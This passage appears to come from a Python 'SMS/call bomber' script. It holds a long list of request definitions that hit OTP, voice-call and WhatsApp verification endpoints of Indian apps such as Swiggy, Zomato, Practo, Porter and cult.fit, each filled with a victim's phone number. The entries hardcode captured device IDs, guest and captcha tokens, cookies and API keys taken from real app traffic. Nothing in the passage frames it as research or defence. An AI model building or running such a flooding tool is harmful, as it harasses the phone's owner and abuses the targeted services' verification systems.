                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0",
            "headers": {
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "tradws.stocknote.com",
                "Connection": "Keep-Alive",
                "Content-Length": "258"
            },
            "data": {
                "request": {
                    "appID": "9218fd7787cf85cc9f58a7c3482a93bc",
                    "formFactor": "M",
                    "requestType": "U",
                    "response_format": "json",
                    "data": {
                        "mobile": number,
                        "remote_add": "0.0.0.0",
                        "user_agent": "StockNote -42041,Android,Google,Android 14,CFNetwork 808.3,Darwin 16.3.0"
                    }
                }
            }
        },
        
       
        {
            "method": "POST",
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "14ded413-164b-411e-99eb-7ff33ae4ad49",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number,
                "organizationId": "64254d66be2a390018e6d348"
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "firstName": "shiva",
                "lastName": "",
                "mobile": number,
                "countryCode": "+91"
            }
        },
        
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "WHATSAPP"}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&isResend=true",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "data": {
                "mobile": number
            },
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
              #  "content-length": str(len(json.dumps(data5))),
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO"
            }
        },
        {
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "data": {
                "device": "Android",
                "mobile_number": number,
                "mode": "IVR",
                "new_user": False
            },
            "headers": {
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IiIsImQuYXAiOiIiLCJkLnRyIjoiYTdmZWJjNzIyMzdiNDNmM2E1YjVmNTIxNjUxYzE0Y2QiLCJkLmlkIjoiMzM1M2I5Yjg1NDJmNDUzNyIsImQudGkiOjE2OTMyMDE5MTUwODF9fQ==",
                "traceparent": "00-a7febc72237b43f3a5b5f521651c14cd-3353b9b8542f4537-00",
                "tracestate": "@nr=0-2---3353b9b8542f4537----1693201915080",
                "x-source": "Android",
                "x-language": "en",
                "x-os": "11",
                "x-app-version-name": "8.4.3",
                "x-app-version-code": "343",
                "x-version-code": "343",
                "x-chatbot-version": "24",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            }
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "retry": True,
                "mobile": number,
                "retryType": "voice",
                "loaderMessage": "Initializing call.."
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "94"
            }
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "mobile": number,
                "appHash": "tG3K6W/hoYi"
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "48"
            }
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup?plt=2&st=1",
            "method": "GET",
            "headers": {
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\"",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                "st": "1",
                "plt": "2",
                "accept": "application/json, text/plain, */*",
                "device": "ba2a15558802b00",
                "pincode": "false",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.7",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.healthkart.com/",
                "accept-encoding": "gzip, deflate, br",
                "cookie": "adb=0; ufi=1; cf_clearance=6NwtHmrzLrHfHDe9UZgqjBzTw20eDLZJIRV6A0YTb88-1695612025-0-1-c3ce1f1.d62b60e6.5b3dbe11-0.2.1695612025"
            }
        },
        {
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "data": {
                "app_version": "7.10.2",
                "aaid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "0ae3a1bee1561e32",
                "class": "",
                "gcm_reg_id": "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"
            },
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "url": "https://micro.doubtnut.com/otp/send-call",
            "method": "PUT",
            "data": {
                "phone": number,
                "locale": "en"
            },
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/requestOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "source": "web",
                "time": "2023-09-24T08:22:25.811Z",
                "digest": "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "299",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/retryOTP",
            "method": "POST",
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "time": "2023-09-24T08:22:57.160Z",
                "digest": "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "284",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
        },
        {
            "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
            "method": "POST",
            "data": {
                "contactNumber": number,
                "domainId": "2"
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
        {
            "url": "https://accounts.practo.com/send_voice_otp",
            "method": "POST",
            "data": {
                "fingerprint": "a40be068-c7fb-3548-9c1b-f26f363f943a",
                "mobile": "+91" + number,
                "device_name": "Xiaomi Redmi Note 7 Pro",
                "client_name": "Practo Android App"
            },
            "headers": {
                "Accept": "application/json",
                "X-DROID-VERSION": "5.84",
                "User-Agent": "Xiaomi Redmi Note 7 Pro 13",
                "X-DROID-VERSION-CODE": "719",
                "Client-Version": "Android-5.84",
                "Time-Zone": "Asia/Kolkata",
                "Client-Name": "Practo Android App",
                "API-Version": "2.0",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Host": "accounts.practo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "url": "https://www.abhibus.com/sendOtp",
            "method": "POST",
            "data": {
                "mobile": number,
                "prd": "mobile",
                "userToken": "03AFcWeA62MtH8YBpjTgPyBhVrIpuHGgFwBPs2Z1fXz93x1zikMCwCkQpkF3XKDj6DVoBo9k_pmre1d6jf7K5MEBnP1zIVVExu2k6FLjFeNs9ifNF27baZoDtci70WNWp4fm9tkfNEJI-96l0ornXSkYsZVXBgjy022-F0x1-X6JRt969GN2O6H8YZyYGUejwNTQ4X9lIy4KvkbG_zHxyUKyK2xSMmHVYIvA3BSeD7rXnihD3A4ukeYYZGEmOWLSmiaGalu5CyWDabEvkUCgvExUP_L2d4Pe8wwOrTDisp9UqzDUSx_lJghg7peLQE9sUFekju_J08eetDIkM5Ol7X-G8pUFLjL--sphbGDKvQAQhDrdARge3HxAFVsdzWTEX8LGCTNAVdBUxx7DMx5VGQPDDSzPFJJnHFD_ba3SxcGEnGGGoXpQjLBbeVkEa9FIUyaNegU_ZnCYzpm06OH3g61Wvw-Wo-a_4uVS4LcYijmpEktS2h6zQADg-zFljOCHIZQ09mFgahjmm5593bV_VvgqM1jTPq4j6EJNQcQg0EP3Ppg1ucPgoxCazgzK7_nMXgd_fQwqNznetjyMrSnpZwLud-4BeVF2P3NoL8gF6Xmwdjc19Yzdb2ZBpnGY4XRylnCtDI99uprHY6x0A1S_VHs1ZKUUBfgtgd38riY-_IVGhgXEhrCzFneSmKWyBYW7vCCJHFDHHC_p2-rNpDVWvqTdF2wxgjK3R6lJIEbocuoq5x6xOayAHDypIYlx0UlmKmVPi-aIQJ8aGuuh4eyyBfX_7CgKxx1PobvJ_Wcdm4-gYx_johZrPAAvW1pdUhdhdXXQ4_8sKuXk8ukzfqT8YcH0fs36ZEjgSIsAykRo_AhNkS2_jyfZLZYkN6ywEbwcsarVtfXYYwaBGqdS7Zo1E-qUjy1G47bfSas1psmQffJbZfooBxKy9dEIvKAtl08YqgBijfEYsGpiAkUHPDt9m8dZRsD7dhR-t-r14IeWg8r1WIM1yxTWhBlDPYtkcE4X4rUkGP_Y-0qVVyXUZL03Wf06s9JiP0o_6BvLcWjCvkza924Y7u3D1DA-cyPC-07xBESMuWy9Oqn9QGYB2LabY-635kRKhjszR2omZupjZoms5EmFDskOi7Tbaz_99MwlUXxGylMHhcVyp1ROeVW5gx5Y6h0U9uGmHqYpFZ4rmx-Nxz-AxdLl9yrYowuYGQTFeA_GT9ZqN1QvuXtlkYNsASOTb4CNwKS0V1wzB1rSOs6KBj1A4tk8ygiwTrRHU31VkmkIbkT5TalyB_M-ZCKDbQBLHD58nSI8BorHOdiO2MLgdKb5ejPLSbUzc9a2pP0R7EufIGEj4V8wW4dQWD8O00T9kDMN6ECC-t9iKYux_7xMd0v_cTkglcC1GQrkMJ5XNY8UL7a0GznQb1woI40UpM2PTzZYraTz9DUmADlkelQ0OShpqgTY1XTD9DuiGAynM7JsU3poWhsk3QkQcuhNqqV4Osrd1GX84WQTjzkN2tGq0TSQVaAsd8nZHq8a2apwkTYoS_QTgu8pc91pg3GAhHuQCHmxnMs2DFmJOH6MH54TLBOZtaRgi6HMwYcZG3yOuHvWqnlhitTpinslIn_4xZ7J9p0aZXtMcI_RQOvfaaXX04dUMIFUdKtzsLJrL35ugI77TOp_BNxmxZVtkD3KXEXT7ToueNyjxePARAi3JfPQ5SLMiwWlBUWfbQwJENyiuJ_11TukY3lBm-4lQic76LudRUxA_aVvtrwAXVOg8zmfzufk8jpUIeLd6wYpST9jLwpm_RhWckzJn-WFBTHBnimzmzP592naP4-w3sqklHDgOBQ6hKgxjqDAApgYrCfZ87MQFprHwcp5r1",
                "version": "10"
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        },
        {
            "url": "https://www.abhibus.com/otp/getOtpCall",
            "method": "POST",
            "data": {
                "mobileNum": number,
                "userToken": "03AFcWeA5ZBXQh4xE1lMZYi1aQadLmSegCgwkOu4TMN-Hd5Prxm6KCwg4gWKfaRl8NqD87Ck2KUqcaSRj0KpCf__jpwfnDDXbpYvEkeTg3stODs53G0KbBPDt8almZVmxodyPyWNXSo62lAkzUnS7St8GmjOB3W_n_j9Bc2ITHfiK4AzJJyJ6iF0_4aK6CylUG60gWtDi19q7G2ReODd-26VpmzPdOEt-2eJNtSLJsgGTcjtypPK-ubZ2jfVxzFcJFRcTdVrSkVg1wl5RdbmaUsiQ50FjZmaZYb0KPelzT1uuFmtEvgcUh10oWAONd40r30chTp1lFt2OSM31prxxM8GXO0bpjkrbmaAdahMleDH_i-2PRQuMCsUcQtYvAbInpTOvyAKOSna9Wv_lvKgHq7750_0HYq-Px4Y7g5jvR5zpAHuvUKuuaUlbO7AW4LB5_zZyXgXwMHOKToj5GUI9QiCA10T4HZX2MwsQsWuJz-CMtazuj2DfWp0mj4Aknom41F_5uzXS-9OWHFyrTJiobUrIAinzNXpHnNhipzqMw8GZY6KbDkSoncFOLuTOZ-Ho7_HUDCecDfm7GiF5xGSrzmeuBChKI6CEkwPNlHs4SaFnzo6vW1bQZ9P0Jpu5oM8b5zBJisaVQFMMzW6cXCYqrIPDzvpvcJY0cvwsVVFvAOEdCtlD4vrFQ2hRcFqgROl6yASg940QeVlsk01O9LYHLQCvFZlDvo5Wfva8y9WUaMeqWU-Cn5ohgDUm_mBs6eFt-0jL6s1dWKi6ZW31amQxtQmk0uTufsL0fKBXmoNC5chnh1FFbCmFxYUHMJ3Ix-C1e-9ePAeVLRmbHOwSKv29mGCnjkgTFsQ3uUxPp7Z91gL93K1J2zQpt4c_XwrgGca8YCx0D34U2DU8VpQD4Nsahh61mNwrpsTz6_TCmqZjPY2kNF7dulhkP6brT18cXZURK9xe5YUvBfqVcnczmJzbd5j7voRNd3NZMtaeFIYRukceQEYi8A9Uc4Z1dvOzKWgSXO9yg_rHp2StudYpcGja4T7xSXWghu9l4evMbhwYi10cxJORlJFlDKe0gE4v0b2vZy6EDcNZVVKxs_X6cHEgTAy-oho-6JiaXwtE209eBJAzWgLMFoagBhW_7fhEi8WEMQeYM-adfOPgZ5vrZxQfclzQxZwQVoC2W25GxHTStuXR-koprUjt7Lhov586MxIljmlPv6dTypmPkpxUySv3KY9fJpRCT3VavfYr1LbpKB07DMmsbmHathQy3OyV-Qaw24kp6YDNGzb-UcNS88fyxtKAWFmiF2X1NOJb8hVMI8rKT0IZfXR24xHzyQG9lyfPhkmkD1D2NBWZqhifh_ye_2ZTD7vOBI4sr4m4git-eMRmhJi0tYuqRgnZOR12Jq82790b2dgLOi1_nb9wHy9b2LCwNynioOXarXEP2DTIYp22Xqev7FoFwdTvno7WzHdViABEM0qc8pC-Uod073aOfbAuXIFAsesZt5lfp3Lf33YIbak6cpWBEccxS2xyvIeyAiZNGxjH1hDJ7qGAdufAOEJCJT7fiW-lGSozJxGWS_ItlligHNN_7c5lfVpWZUADtTYQPGPd2V3O7nw64bf2v0oT9xbZMxt12RmOc9Ko2Zn3uJCJ4f9GQP5ox7lHQRJYxbddycD0B3mGE1PmIOGxnsweJ9AGvTjF4bflxrjEAgNj9LLcle-fqyKhxU6TX8jSQ9sVX2XYpEYox_m9osgp47RXKbADmV7itVKogwjDm_2Y4rhTncuYzz9dRFeHbSOXrQScvkuuEDZXVG6UpWS_tDUSRYvvJClbL1xisrOB_4sa3mM9OLGq8XNg6FplEdwRDzM0hpq2CTG_"
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/plain, */*",
                "x-app-name": "msiten",
                "x-mweb-version": "1.4.2",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36"
            }
        },
        {
            "url": "https://www.cult.fit/api/auth/loginPhoneSendOtp",
            "method": "POST",
            "data": {
                "branchAnalyticsData": {},
                "phone": number,
                "medium": "call",
                "countryCallingCode": "+91",
                "deviceInfo": {
                    "appId": "fit.cure.android",
                    "bundleId": "fit.cure.android",
                    "brand": "Xiaomi",
                    "model": "Redmi Note 7 Pro",
                    "osName": "Android",
                    "osVersion": "13",
                    "deviceId": "aba34bc1f2672cc6",
                    "encryptedDeviceId": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                    "localeCountryCode": "US",
                    "size": {"height": 822, "width": 393},
                    "colorScheme": "dark"
                }
            },
            "headers": {
                "Host": "www.cult.fit",
                "accept": "application/json",
                "clientversion": "10.21",
                "osname": "android",
                "accept-encoding": "gzip",
                "timezone": "Asia/Kolkata",
                "codepushversion": "undefined",
                "deviceid": "aba34bc1f2672cc6",
                "encrypteddeviceid": "G%2FafzOE%2FQ%2FuzAKDrR9dLNJLt9SRIQi2BbRM3xvPcj9x2lJce1hNXw%2FBvOmZkP6dSH%2FF3EhKdjG34%0APgQSXu%2F%2FrLSyQU9ApUUmA4AsFfMgDhW5kMS72pCcfZG0gIhSjVgzuzLvPtvaORg1WZ7Ovy7e62so%0AC0fhl2qOkJRZTy2rGhMifXEDEXqgQCYAdc5jmV5vLDyzKj%2FlivhP0OCSR2OA3ANhuqe8kKwirzTI%0AFQe0u%2BjIjuU%2BW4WdqepcweBhOcgYULl%2FjTif%2BxA1AhQygiSx%2BATQLw7jPdbMHLEwrpA5%2FoRWq5wS%0A7go%2BCKcvihR2wtMTqMqEOWyTRbm7A%2F%2Bvr%2F9nLvmAb1sINo%2FoM7sKCGP5%2FaDetHqB73%2BqUOEPoa1K%0AstP7MExClWQrUpDIkUDPBxI%2FB7tMw1s4VPjhHQBsPkC9fwWMDes6DbhvTqxc6IFi5e1VQ2ya1Kbf%0ADVG0rvfU7%2BUF87%2BTUVbB%2B12uDvrSRSYg31t3T7S6%2FiM2xT9MOsoJIvAfz5SUxDLDeo7mvg0JbQcj%0AeDyXqGjv0Kmat4lZ4eF3p3uHNfvTAYN5E5oFqHQ0T%2F2zj6nPFocp3%2BqHlvnfI6NULvup%2FrkQZSoc%0Ajg8BF6iwuUnsI44D%2FEl7MibWzNdySgObQ4zoRvt1rXjlWhes1HdsB4hJHer96j9wFpHEQ5ACa7Y%3D%0A",
                "devicebrand": "Xiaomi",
                "devicemodel": "Redmi Note 7 Pro",
                "x-request-id": "18e6f566-9311-d97a-77f2-c987db0a71c7",
                "x-tenant-id": "curefit",
                "advertiserid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "content-type": "application/json",
             #   "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/4.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://api.zomato.com/v2/user_login/initiate?android_country=US&lang=en&android_language=en&city_id=-1",
            "headers": {
                "Host": "api.zomato.com",
                "content-length": "131",
                "x-appsflyer-uid": "1692101582494-5255636354974981849",
                "x-present-lat": "0.0",
                "x-user-defined-lat": "0.0",
                "x-jumbo-session-id": "4bab808d-a018-47d4-ada9-9bcced38c52f1692101582",
                "x-accessibility-voice-over-enabled": "0",
                "user-agent": "&source=android_market&version=13&device_manufacturer=Xiaomi&device_brand=Xiaomi&device_model=Redmi+Note+7+Pro&api_version=765&app_version=v17.6.5",
                "x-device-language": "en-US",
                "x-rider-installed": "false",
                "x-zomato-client-id": "5276d7f1-910b-4243-92ea-d27e758ad02b",
                "x-present-long": "0.0",
                "x-client-id": "zomato_android_v2",
                "x-network-type": "wifi",
                "x-zomato-uuid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "x-app-language": "&lang=en&android_language=en&android_country=US",
                "x-firebase-instance-id": "ff7f36e38e9a4a81c47b7b7b513d1079",
                "x-device-pixel-ratio": "2.75",
                "x-o2-city-id": "-1",
                "x-android-id": "70fdf49b1f43f5ca",
                "x-zomato-app-version-code": "1710017650",
                "accept": "image/webp",
                "x-request-id": "a5e650d2-e40b-4add-b6cd-a796ec8244cb",
                "x-zomato-app-version": "765",
                "x-city-id": "-1",
                "x-device-width": "1080",
                "pragma": "akamai-x-get-request-id,akamai-x-cache-on, akamai-x-check-cacheable",
                "x-vpn-active": "1",
                "x-device-height": "2260",
                "x-user-defined-long": "0.0",
                "x-installer-package-name": "com.android.vending",
                "x-blinkit-installed": "false",
                "x-access-uuid": "c59c4031-8325-4686-a866-57a73b74d342",
                "x-accessibility-dynamic-text-scale-factor": "1.0",
                "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
